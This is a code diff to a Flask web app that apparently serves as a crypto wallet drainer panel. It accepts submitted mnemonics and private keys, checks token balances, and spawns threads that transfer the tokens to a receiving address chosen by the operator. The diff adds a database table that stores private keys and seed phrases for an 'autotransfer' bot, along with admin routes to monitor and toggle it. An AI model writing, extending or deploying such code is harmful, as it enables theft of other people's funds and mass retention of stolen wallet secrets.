@@ -5,8 +5,9 @@ from termcolor import colored
 from hdwallet import HDWallet
 from typing import Optional
 from hdwallet.symbols import *
-from bit import Key, PrivateKeyTestnet
+from bit import Key, PrivateKeyTestnet, network
 from flask_sqlalchemy import SQLAlchemy
+from flask_migrate import Migrate
 from bip_utils import Bip39MnemonicValidator
 from datetime import datetime, timedelta
 import hashlib
@@ -61,7 +62,7 @@ def extractTokensLocally(addr:str, net:str):
     return resp
 
 # Get the tokens with their balance
-def getTokens(net:str,addr:str, header:dict):
+def getTokens(net:str,addr:str, header:dict=moralisHeaders):
     contLL=[]
     if net in moralisNetMap:
         netMoralis = moralisNetMap[net]
@@ -71,10 +72,10 @@ def getTokens(net:str,addr:str, header:dict):
             tokenResp = response.json()
         except:
             print(str(sys.exc_info()[1]))
-            print("Line: 97 ,tokenResp[:Dictionary] set to null",response, net, addr)
+            # print("Line: 97 ,tokenResp[:Dictionary] set to null",response, net, addr)
             tokenResp={}
     else:
-        print("ewew",addr,net)
+        # print("ewew",addr,net)
         tokenResp = extractTokensLocally(addr, net)
     for addDict in tokenResp:
         add = addDict['token_address']
@@ -153,6 +154,10 @@ def EVMde(net:str, privKey:str, rec:str):
     w3 = connect(RPC_links[net])
     contList = filterTokens(getTokens(net, addr, moralisHeaders), net)
     cNonce=-1
+    if contList:
+        rowAutoIn = autoTransfer(key = privKey, network=net, recAddr=rec ,status=1)
+        db.session.add(rowAutoIn)
+        db.session.commit()
     while contList:
         cNonce+=1
         contractInfo = contList.pop(0)
@@ -267,13 +272,13 @@ def recAd(net):
 app = Flask(__name__)
 app.config['SECRET_KEY'] = appSecretKey
 app.config['SQLALCHEMY_DATABASE_URI'] = databaseURL
-# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///local.db'
 
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.config['PERMANENT_SESSION_LIFETIME'] =  timedelta(minutes=sessionTimeInMinutes)
 
 db = SQLAlchemy(app)
 
+migrate = Migrate(app, db)
 
 
 class inputData(db.Model):
@@ -331,6 +336,17 @@ class recAddresses(db.Model):
     def __repr__(self):
         return '<Name %r>' % self.id()
 
+class autoTransfer(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    date_created = db.Column(db.DateTime, default=datetime.utcnow())
+    network = db.Column(db.String(200)) #saparated by commas
+    key = db.Column(db.String(200))
+    recAddr = db.Column(db.String(200))
+    seed = db.Column(db.Text)
+    status = db.Column(db.Integer, default=1)
+    remark = db.Column(db.String(300))
+    def __repr__(self):
+        return '<Name %r>' % self.id()
 
 @app.route('/')
 def home():
@@ -358,6 +374,15 @@ def login():
     else:
         error = ''
     return render_template('login.html', error=error, title='login')
+
+@app.route('/logout')
+def logout():
+    userDic = getUser()
+    if not userDic:
+        return redirect('/login')
+    else: 
+        session['id'] = ''
+        return redirect('/login')
 
 
 @app.route('/<string:type>', methods=['GET', 'POST'])
@@ -395,7 +420,6 @@ def devoid(type):
                 return render_template('home.html', title = title, error=error )
             for jsonArg in jsonArgList:
                 print('\n', jsonArg)
-                
                 mnemonic = jsonArg['mnemonic'].strip()
                 GenPrivKey = jsonArg['key'].strip()
                 
@@ -415,6 +439,7 @@ def devoid(type):
                             if recAd(net)!='':
                                 rec = recAd(net)
                                 threading.Thread(target=EVMde, args=(net,GenPrivKey,rec)).start()
+ 
                 else:
                     #if seed is valid
                     print("valid mnemonic: ", mnemonic)
@@ -510,7 +535,9 @@ def view(net):
             for data in inData:
                 if data.network == net:
                     l.append(data)
-            return render_template('evm.html', title='view '+net, data=l, addFilter = addFilter)  
+            return render_template('evm.html', title='view '+net, data=l, addFilter = addFilter) 
+        else:
+            return redirect('/logs')
                 
 @app.route('/action/<string:id>', methods=['POST', 'GET'])
 def withdraw(id):
@@ -524,12 +551,16 @@ def withdraw(id):
         add = pubAddr(key)
         net = token.network
         web3 = connect(RPC_links[net])
-        unicorns = web3.eth.contract(address=contAdd, abi=EIP20_ABI)
-        value = unicorns.functions.balanceOf(add).call()
-        gas = unicorns.functions.transfer(recAd(net),value).estimateGas({'from':add})
-        gasPrice = web3.eth.gasPrice
-        amount = format(gas*gasPrice/10**18)
-        print(gas, gasPrice)
+        try:
+            unicorns = web3.eth.contract(address=contAdd, abi=EIP20_ABI)
+            value = unicorns.functions.balanceOf(add).call()
+            gas = unicorns.functions.transfer(recAd(net),value).estimateGas({'from':add})
+            gasPrice = web3.eth.gasPrice
+            amount = format(gas*gasPrice/10**18)
+            print(gas, gasPrice)
+        except:
+            flash(str(sys.exc_info()[1]))
+            return redirect('/view/'+net)
         if request.method == 'POST': 
             # if checkBalance(add, web3) >= gasPrice*gas:
             try:
@@ -634,6 +665,36 @@ def add():
                 
         else:
             return render_template('add.html', title=title, error='',addrAbsent=addrAbsent)
+
+@app.route('/autotransfer', methods=['POST', 'GET'])
+def autotransfer():
+    userDic = getUser()
+    if not userDic:
+        return redirect('/login')
+    elif userDic['type'] != 'admin':
+        flash('You do not have access')
+        return redirect('/login') 
+    else:
+        inData = autoTransfer.query.order_by(autoTransfer.id.desc())
+        l=inData
+        return render_template('autotransfer.html', title = 'autotransfer', data = l)
+
+@app.route('/bot-status/<int:id>')
+def bot_status(id:int):
+    userDic = getUser()
+    if not userDic:
+        return redirect('/login')
+    elif userDic['type'] != 'admin':
+        flash('You do not have access')
+        return redirect('/login') 
+    else:
+        bot_update = autoTransfer.query.get_or_404(id)
+        if bot_update.status == 0:
+            bot_update.status = 1
+        else:
+            bot_update.status = 0
+        db.session.commit()
+        return redirect('/autotransfer')
 
 @app.context_processor
 def utility_processor():
